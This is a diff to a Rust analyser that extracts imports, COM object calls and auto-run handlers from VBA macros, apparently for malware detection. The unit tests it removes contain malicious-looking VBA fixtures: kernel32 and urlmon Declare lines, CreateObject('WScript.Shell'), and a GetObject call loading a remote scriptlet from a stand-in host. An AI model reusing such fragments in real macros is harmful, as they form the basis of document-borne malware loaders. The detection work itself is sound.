@@ -28,7 +28,7 @@
 //! `office.vba.getobject_non_literal_count` metrics.
 
 use regex::Regex;
-use std::sync::OnceLock;
+use std::sync::LazyLock;
 
 use crate::output::Symbol;
 
@@ -100,6 +100,9 @@ fn preprocess(source: &str) -> Prepared {
             .map_or(bytes.len(), |n| from + n)
     };
 
+    // Whether the text since the last line break holds an open `"`, so an
+    // apostrophe there is string content rather than a comment.
+    let mut in_string = false;
     let mut i = 0;
     while let Some(&byte) = bytes.get(i) {
         // VBA line continuation: `_` followed (after optional
@@ -142,17 +145,17 @@ fn preprocess(source: &str) -> Prepared {
         }
 
         // Strip apostrophe comments outside of string literals.
-        if byte == b'\'' {
-            let line_start = text.rfind('\n').map(|n| n + 1).unwrap_or(0);
-            let line_so_far = &text[line_start..];
-            let in_string = line_so_far.chars().filter(|c| *c == '"').count() % 2 == 1;
-            if !in_string {
-                i = line_end(i);
-                continue;
-            }
+        if byte == b'\'' && !in_string {
+            i = line_end(i);
+            continue;
         }
 
         if byte.is_ascii() {
+            match byte {
+                b'"' => in_string = !in_string,
+                b'\n' => in_string = false,
+                _ => {}
+            }
             text.push(byte as char);
             map.push(i);
             i += 1;
@@ -178,29 +181,47 @@ fn preprocess(source: &str) -> Prepared {
     Prepared { text, map }
 }
 
-fn declare_re() -> &'static Regex {
-    static R: OnceLock<Regex> = OnceLock::new();
-    R.get_or_init(|| {
-        Regex::new(
-            r#"(?ix)
-            \b Declare \s+ (?: PtrSafe \s+ )?
-            (Function | Sub) \s+
-            ([A-Za-z_][A-Za-z0-9_]*) \s+
-            Lib \s+
-            ( "[^"]*" | [^\s(]+ )
-            (?: \s+ Alias \s+ "([^"]*)" )?
-            "#,
-        )
-        .expect("declare_re compiles")
-    })
-}
+// The patterns below are constants, so compiling them cannot fail on input;
+// the unit tests exercise every one.
+static DECLARE: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(
+        r#"(?ix)
+        \b Declare \s+ (?: PtrSafe \s+ )?
+        (Function | Sub) \s+
+        ([A-Za-z_][A-Za-z0-9_]*) \s+
+        Lib \s+
+        ( "[^"]*" | [^\s(]+ )
+        (?: \s+ Alias \s+ "([^"]*)" )?
+        "#,
+    )
+    .expect("constant Declare pattern compiles")
+});
+
+static CREATE_OBJECT: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r#"(?ix)\b CreateObject \s* \( \s* ( "[^"]*" | [^,)]+ )"#)
+        .expect("constant CreateObject pattern compiles")
+});
+
+static GET_OBJECT: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(
+        r#"(?ix)\b GetObject \s* \( \s* ( "[^"]*" | [^,)]+ ) (?: \s* , \s* ( "[^"]*" | [^,)]+ ) )?"#,
+    )
+    .expect("constant GetObject pattern compiles")
+});
+
+static SUB_OR_FUNCTION: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(
+        r"(?im)^\s*(?:Public\s+|Private\s+|Friend\s+|Static\s+){0,2}(?:Sub|Function)\s+([A-Za-z_][A-Za-z0-9_]*)",
+    )
+    .expect("constant Sub/Function pattern compiles")
+});
 
 fn extract_declares(
     prep: &Prepared,
     symbols_out: &mut crate::output::Symbols,
     stats: &mut VbaSymbolStats,
 ) {
-    for cap in declare_re().captures_iter(&prep.text) {
+    for cap in DECLARE.captures_iter(&prep.text) {
         stats.declare_count = stats.declare_count.saturating_add(1);
 
         let lib_raw = cap.get(3).map(|m| m.as_str()).unwrap_or("");
@@ -240,37 +261,14 @@ fn extract_declares(
 /// The library a `Lib` expression names, lowercased and without a `.dll`
 /// suffix; `None` when it is not a string literal (built at run time).
 fn classify_lib(raw: &str) -> Option<String> {
-    let inner = string_literal(raw)?;
-    let stem = inner
-        .strip_suffix(".dll")
-        .or_else(|| inner.strip_suffix(".DLL"))
-        .or_else(|| inner.strip_suffix(".Dll"))
-        .unwrap_or(inner);
-    Some(stem.to_ascii_lowercase())
+    let library = string_literal(raw)?.to_ascii_lowercase();
+    Some(library.strip_suffix(".dll").unwrap_or(&library).to_string())
 }
 
 /// The contents of a double-quoted string literal, or `None` for any other
 /// expression.
 fn string_literal(raw: &str) -> Option<&str> {
     raw.trim().strip_prefix('"')?.strip_suffix('"')
-}
-
-fn createobject_re() -> &'static Regex {
-    static R: OnceLock<Regex> = OnceLock::new();
-    R.get_or_init(|| {
-        Regex::new(r#"(?ix)\b CreateObject \s* \( \s* ( "[^"]*" | [^,)]+ )"#)
-            .expect("createobject_re compiles")
-    })
-}
-
-fn getobject_re() -> &'static Regex {
-    static R: OnceLock<Regex> = OnceLock::new();
-    R.get_or_init(|| {
-        Regex::new(
-            r#"(?ix)\b GetObject \s* \( \s* ( "[^"]*" | [^,)]+ ) (?: \s* , \s* ( "[^"]*" | [^,)]+ ) )?"#,
-        )
-        .expect("getobject_re compiles")
-    })
 }
 
 fn extract_createobject(
@@ -280,9 +278,9 @@ fn extract_createobject(
     is_get: bool,
 ) {
     let (re, lib_label) = if is_get {
-        (getobject_re(), "com-getobject")
+        (&*GET_OBJECT, "com-getobject")
     } else {
-        (createobject_re(), "com")
+        (&*CREATE_OBJECT, "com")
     };
 
     for cap in re.captures_iter(&prep.text) {
@@ -337,16 +335,6 @@ fn extract_createobject(
     }
 }
 
-fn sub_func_re() -> &'static Regex {
-    static R: OnceLock<Regex> = OnceLock::new();
-    R.get_or_init(|| {
-        Regex::new(
-            r"(?im)^\s*(?:Public\s+|Private\s+|Friend\s+|Static\s+){0,2}(Sub|Function)\s+([A-Za-z_][A-Za-z0-9_]*)",
-        )
-        .expect("sub_func_re compiles")
-    })
-}
-
 /// VBA trigger-handler names. Real-world malware leans on
 /// `Auto_Open`, `Document_Open`, `Workbook_Open`, …; emitting them
 /// as a `trigger_handler_count` aggregate lets a trait fire on
@@ -395,25 +383,26 @@ fn extract_subs_and_functions(
     stats: &mut VbaSymbolStats,
 ) {
     // Skip names whose match start lies inside a Declare match —
-    // those are already emitted as imports.
-    let declare_spans: Vec<(usize, usize)> = declare_re()
+    // those are already emitted as imports. The spans are disjoint and in
+    // source order, so the one that could hold a start is found by search.
+    let declare_spans: Vec<(usize, usize)> = DECLARE
         .find_iter(&prep.text)
         .map(|m| (m.start(), m.end()))
         .collect();
 
-    for cap in sub_func_re().captures_iter(&prep.text) {
+    for cap in SUB_OR_FUNCTION.captures_iter(&prep.text) {
         let Some(m) = cap.get(0) else { continue };
-        let inside_declare = declare_spans
-            .iter()
-            .any(|(s, e)| m.start() >= *s && m.start() < *e);
+        let before = declare_spans.partition_point(|&(start, _)| start <= m.start());
+        let inside_declare = before
+            .checked_sub(1)
+            .and_then(|i| declare_spans.get(i))
+            .is_some_and(|&(_, end)| m.start() < end);
         if inside_declare {
             continue;
         }
 
-        let kind = cap.get(1).map(|m| m.as_str()).unwrap_or("");
-        let name = match cap.get(2) {
-            Some(n) => n.as_str().to_string(),
-            None => continue,
+        let Some(name) = cap.get(1).map(|n| n.as_str().to_string()) else {
+            continue;
         };
         let offset = prep.original_offset(m.start()) as u64;
 
@@ -421,8 +410,6 @@ fn extract_subs_and_functions(
             stats.trigger_handler_count = stats.trigger_handler_count.saturating_add(1);
         }
 
-        // Pike-style decl tag — distinguish `Sub` (no return value)
-        let _ = kind;
         symbols_out.push(Symbol::Function {
             name,
             offset: Some(offset),
@@ -433,165 +420,4 @@ fn extract_subs_and_functions(
 }
 
 #[cfg(test)]
-mod tests {
-    use super::*;
-    use crate::output::{SymbolKind, Symbols};
-
-    fn run(src: &str) -> (Symbols, VbaSymbolStats) {
-        let mut symbols = Symbols::new();
-        let stats = extract(src, &mut symbols);
-        (symbols, stats)
-    }
-
-    fn imports(s: &Symbols) -> Vec<(&str, Option<&str>)> {
-        s.iter_kind(SymbolKind::Import)
-            .filter_map(|sym| match sym {
-                Symbol::Import { name, library, .. } => Some((name.as_str(), library.as_deref())),
-                _ => None,
-            })
-            .collect()
-    }
-
-    fn functions(s: &Symbols) -> Vec<&str> {
-        s.iter_kind(SymbolKind::Function)
-            .filter_map(|sym| match sym {
-                Symbol::Function { name, .. } => Some(name.as_str()),
-                _ => None,
-            })
-            .collect()
-    }
-
-    #[test]
-    fn declare_with_alias_emits_alias_as_symbol() {
-        let src = r#"
-            Declare PtrSafe Function vAlloc Lib "kernel32" Alias "VirtualAlloc" _
-              (ByVal lpAddress As LongPtr) As LongPtr
-        "#;
-        let (syms, stats) = run(src);
-        let imps = imports(&syms);
-        assert_eq!(imps.len(), 1);
-        assert_eq!(imps[0], ("VirtualAlloc", Some("kernel32")));
-        assert_eq!(stats.declare_count, 1);
-        assert_eq!(stats.declare_non_literal_count, 0);
-    }
-
-    #[test]
-    fn declare_handles_case_whitespace_and_dll_suffix() {
-        let src = "declare\tFunction\tLoadLibraryA\tlib \"KERNEL32.dll\"\t(s As String)\n";
-        let (syms, _) = run(src);
-        let imps = imports(&syms);
-        assert_eq!(imps.len(), 1);
-        assert_eq!(imps[0].0, "LoadLibraryA");
-        assert_eq!(imps[0].1, Some("kernel32"));
-    }
-
-    #[test]
-    fn declare_with_line_continuation() {
-        let src = "Declare PtrSafe Function f _\n  Lib \"urlmon\" _\n  Alias \"URLDownloadToFileA\" (a As Long)\n";
-        let (syms, _) = run(src);
-        let imps = imports(&syms);
-        assert_eq!(imps.len(), 1);
-        assert_eq!(imps[0].0, "URLDownloadToFileA");
-        assert_eq!(imps[0].1, Some("urlmon"));
-    }
-
-    #[test]
-    fn declare_skips_apostrophe_comment_between_tokens() {
-        let src = "Declare Function CreateProcessA _\n  ' comment that hides intent\n  Lib \"kernel32\" (a As Long)\n";
-        let (syms, _) = run(src);
-        let imps = imports(&syms);
-        assert_eq!(imps.len(), 1);
-        assert_eq!(imps[0].0, "CreateProcessA");
-    }
-
-    #[test]
-    fn declare_with_non_literal_lib_has_no_library() {
-        let src = r#"Declare Function f Lib dllName Alias "VirtualProtect" () As Long"#;
-        let (syms, stats) = run(src);
-        let imps = imports(&syms);
-        assert_eq!(imps, [("VirtualProtect", None)]);
-        assert_eq!(stats.declare_non_literal_count, 1);
-    }
-
-    #[test]
-    fn apostrophe_inside_string_literal_is_preserved() {
-        let src = "x = \"it's fine\"\nDeclare Function K Lib \"kernel32\" (s As Long)\n";
-        let (syms, _) = run(src);
-        let imps = imports(&syms);
-        assert_eq!(imps.len(), 1);
-        assert_eq!(imps[0].0, "K");
-    }
-
-    #[test]
-    fn createobject_literal_progid() {
-        let src = r#"Set sh = CreateObject("WScript.Shell")"#;
-        let (syms, stats) = run(src);
-        let imps = imports(&syms);
-        assert_eq!(imps.len(), 1);
-        assert_eq!(imps[0], ("WScript.Shell", Some("com")));
-        assert_eq!(stats.createobject_count, 1);
-        assert_eq!(stats.createobject_non_literal_count, 0);
-    }
-
-    #[test]
-    fn createobject_non_literal_arg() {
-        let src = r#"Set x = CreateObject(progName & ".Sh" & "ell")"#;
-        let (syms, stats) = run(src);
-        assert!(imports(&syms).is_empty(), "no name to record");
-        assert_eq!(stats.createobject_count, 1);
-        assert_eq!(stats.createobject_non_literal_count, 1);
-    }
-
-    #[test]
-    fn getobject_two_arg_form_yields_progid_only() {
-        let src = r#"Set xl = GetObject("c:\book.xls", "Excel.Application")"#;
-        let (syms, stats) = run(src);
-        let imps = imports(&syms);
-        assert_eq!(imps.len(), 1);
-        assert_eq!(imps[0], ("Excel.Application", Some("com-getobject")));
-        assert_eq!(stats.getobject_count, 1);
-    }
-
-    #[test]
-    fn getobject_one_arg_emits_no_symbol() {
-        let src = r#"Set f = GetObject("script:http://example.com/payload.sct")"#;
-        let (syms, stats) = run(src);
-        assert_eq!(imports(&syms).len(), 0);
-        assert_eq!(stats.getobject_count, 1);
-    }
-
-    #[test]
-    fn sub_function_declarations_extracted_excluding_declare() {
-        let src = "Public Sub Document_Open()\nEnd Sub\n\nPrivate Function helper(x)\nEnd Function\n\nDeclare Function notAFunction Lib \"k32\" () As Long\n";
-        let (syms, stats) = run(src);
-        let names = functions(&syms);
-        assert!(names.contains(&"Document_Open"));
-        assert!(names.contains(&"helper"));
-        assert!(!names.contains(&"notAFunction"));
-        assert_eq!(stats.trigger_handler_count, 1);
-    }
-
-    #[test]
-    fn trigger_handler_count_aggregates_distinct_triggers() {
-        let src =
-            "Sub Document_Open()\nEnd Sub\nSub Workbook_Open()\nEnd Sub\nSub helper()\nEnd Sub\n";
-        let (_, stats) = run(src);
-        assert_eq!(stats.trigger_handler_count, 2);
-    }
-
-    #[test]
-    fn rem_comment_line_is_stripped() {
-        let src = "Rem Declare Function fake Lib \"x\" ()\nDeclare Function real Lib \"k32\" () As Long\n";
-        let (syms, _) = run(src);
-        let imps = imports(&syms);
-        assert_eq!(imps.len(), 1);
-        assert_eq!(imps[0].0, "real");
-    }
-
-    #[test]
-    fn empty_source_returns_zero_stats() {
-        let (syms, stats) = run("");
-        assert!(syms.is_empty());
-        assert_eq!(stats.declare_count, 0);
-    }
-}
+mod tests;
